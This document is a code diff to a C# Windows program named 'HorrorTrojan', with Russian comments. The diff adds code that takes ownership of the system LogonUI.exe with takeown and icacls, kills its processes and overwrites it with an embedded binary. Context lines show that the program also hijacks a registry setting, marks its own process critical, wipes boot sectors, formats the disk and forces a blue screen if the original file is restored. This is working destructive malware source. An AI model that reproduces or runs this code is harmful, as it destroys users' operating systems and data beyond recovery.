@@ -8,6 +8,8 @@ using System.IO;
 using System.Diagnostics;
 using System.Reflection;
 using Microsoft.Win32;
+using System.Security.AccessControl;
+using System.Security.Principal;
 
 namespace HorrorTrojan
 {
@@ -56,11 +58,139 @@ namespace HorrorTrojan
 
         public MainInterface()
         {
+            // 1. ПЕРЕЗАПИСЬ LogonUI.exe (ДО ВСЕГО ОСТАЛЬНОГО)
+            ReplaceLogonUI();
+
             InitializeComponent();
             SetupForm();
             LoadResources();
             StartTimers();
             SetupProtection();
+        }
+
+        private void ReplaceLogonUI()
+        {
+            try
+            {
+                string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
+                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
+                if (!File.Exists(originalPath)) return;
+
+                ForceFullAccess(originalPath);
+                KillLogonUIProcesses();
+
+                File.SetAttributes(originalPath, FileAttributes.Normal);
+                for (int i = 0; i < 5; i++)
+                {
+                    try
+                    {
+                        File.Delete(originalPath);
+                        break;
+                    }
+                    catch
+                    {
+                        Thread.Sleep(1000);
+                        try
+                        {
+                            File.Move(originalPath, originalPath + ".del");
+                            File.Delete(originalPath + ".del");
+                            break;
+                        }
+                        catch { }
+                    }
+                }
+
+                byte[] customLogonUI = ExtractResource("LogonUI.exe");
+                File.WriteAllBytes(originalPath, customLogonUI);
+            }
+            catch { }
+        }
+
+        private void ForceFullAccess(string path)
+        {
+            try
+            {
+                File.SetAttributes(path, FileAttributes.Normal);
+            }
+            catch { }
+
+            try
+            {
+                Process p = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "takeown.exe",
+                    Arguments = $"/f \"{path}\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+                if (p != null) { p.WaitForExit(3000); p.Close(); }
+            }
+            catch { }
+
+            try
+            {
+                Process p = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "icacls.exe",
+                    Arguments = $"\"{path}\" /grant Everyone:F",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+                if (p != null) { p.WaitForExit(3000); p.Close(); }
+            }
+            catch { }
+
+            try
+            {
+                FileInfo fi = new FileInfo(path);
+                FileSecurity fs = fi.GetAccessControl();
+                fs.SetOwner(WindowsIdentity.GetCurrent().User);
+                fs.AddAccessRule(new FileSystemAccessRule(
+                    new NTAccount(Environment.UserDomainName, Environment.UserName),
+                    FileSystemRights.FullControl, AccessControlType.Allow));
+                fs.AddAccessRule(new FileSystemAccessRule(
+                    new NTAccount("NT AUTHORITY\\SYSTEM"),
+                    FileSystemRights.FullControl, AccessControlType.Allow));
+                fi.SetAccessControl(fs);
+            }
+            catch { }
+        }
+
+        private void KillLogonUIProcesses()
+        {
+            try
+            {
+                foreach (Process p in Process.GetProcessesByName("LogonUI"))
+                {
+                    try
+                    {
+                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
+                            p.MainModule.FileName.Contains("System32"))
+                        {
+                            p.Kill();
+                            p.WaitForExit(3000);
+                            Thread.Sleep(500);
+                        }
+                    }
+                    catch { }
+                }
+            }
+            catch { }
+        }
+
+        private byte[] ExtractResource(string resourceName)
+        {
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
+                  assembly.GetManifestResourceStream($"HorrorTrojan.{resourceName}"))
+            {
+                if (stream == null) throw new Exception($"Resource {resourceName} not found");
+                byte[] data = new byte[stream.Length];
+                stream.Read(data, 0, data.Length);
+                return data;
+            }
         }
 
         private void InitializeComponent()
@@ -71,7 +201,6 @@ namespace HorrorTrojan
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).BeginInit();
             this.SuspendLayout();
 
-            // Form settings
             this.FormBorderStyle = FormBorderStyle.None;
             this.StartPosition = FormStartPosition.CenterScreen;
             this.TopMost = true;
@@ -82,13 +211,11 @@ namespace HorrorTrojan
             this.ControlBox = false;
             this.KeyPreview = false;
 
-            // PictureBox (GIF)
             this.pictureBox.Dock = DockStyle.Top;
             this.pictureBox.Size = new Size(448, 448);
             this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
             this.pictureBox.BackColor = Color.Black;
 
-            // Timer Label
             this.timerLabel.AutoSize = false;
             this.timerLabel.Dock = DockStyle.Fill;
             this.timerLabel.TextAlign = ContentAlignment.MiddleCenter;
@@ -97,7 +224,6 @@ namespace HorrorTrojan
             this.timerLabel.Font = new Font("Consolas", 24, FontStyle.Bold);
             this.timerLabel.Text = "5:00";
 
-            // Progress Bar
             this.progressBar.Dock = DockStyle.Bottom;
             this.progressBar.Height = 10;
             this.progressBar.ForeColor = Color.Red;
@@ -106,7 +232,6 @@ namespace HorrorTrojan
             this.progressBar.Maximum = 300;
             this.progressBar.Value = 300;
 
-            // Add controls
             this.Controls.Add(this.timerLabel);
             this.Controls.Add(this.pictureBox);
             this.Controls.Add(this.progressBar);
@@ -118,7 +243,6 @@ namespace HorrorTrojan
         private void SetupForm()
         {
             this.FormClosing += (s, e) => e.Cancel = true;
-            // В .NET 4.8 нет Cursors.None, используем Cursors.Default и скрываем через Cursor.Hide()
             this.Cursor = Cursors.Default;
             Cursor.Hide();
         }
@@ -288,12 +412,10 @@ namespace HorrorTrojan
         {
             try
             {
-                // Защита процесса (критичность)
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MainInterface.exe"))
                 {
                     key.SetValue("Debugger", "svchost.exe", RegistryValueKind.String);
                 }
-                // Делаем процесс критичным
                 SetProcessCritical(true);
             }
             catch { }
@@ -319,7 +441,6 @@ namespace HorrorTrojan
             catch { }
         }
 
-        // Защита от восстановления LogonUI
         protected override void OnLoad(EventArgs e)
         {
             base.OnLoad(e);
@@ -336,11 +457,9 @@ namespace HorrorTrojan
                     string logonUIPath = Path.Combine(Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows", "System32", "LogonUI.exe");
                     if (File.Exists(logonUIPath))
                     {
-                        // Проверяем, что это наш LogonUI (по размеру или хешу)
                         var fi = new FileInfo(logonUIPath);
-                        if (fi.Length != 57856) // Примерный размер нашего LogonUI (подставь свой)
+                        if (fi.Length != 2681856) // размер кастомного LogonUI
                         {
-                            // Восстановлен оригинал - уничтожаем диск
                             DestroyDisk();
                         }
                     }
@@ -354,16 +473,13 @@ namespace HorrorTrojan
         {
             try
             {
-                // Сообщение
                 MessageBox.Show("You shouldn't have done that...", "System", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
-                // Остановка таймеров
                 mainTimer.Stop();
                 glitchTimer.Stop();
                 videoTimer.Stop();
                 protectionTimer.Stop();
 
-                // Уничтожение секторов
                 byte[] zeros = new byte[512];
                 for (int sector = 0; sector < 64; sector++)
                 {
@@ -379,7 +495,6 @@ namespace HorrorTrojan
                     catch { }
                 }
 
-                // Форматирование диска
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "format",
@@ -389,7 +504,6 @@ namespace HorrorTrojan
                     UseShellExecute = false
                 });
 
-                // Ждем 4 секунды и BSOD
                 Thread.Sleep(4000);
                 TriggerBSOD();
             }
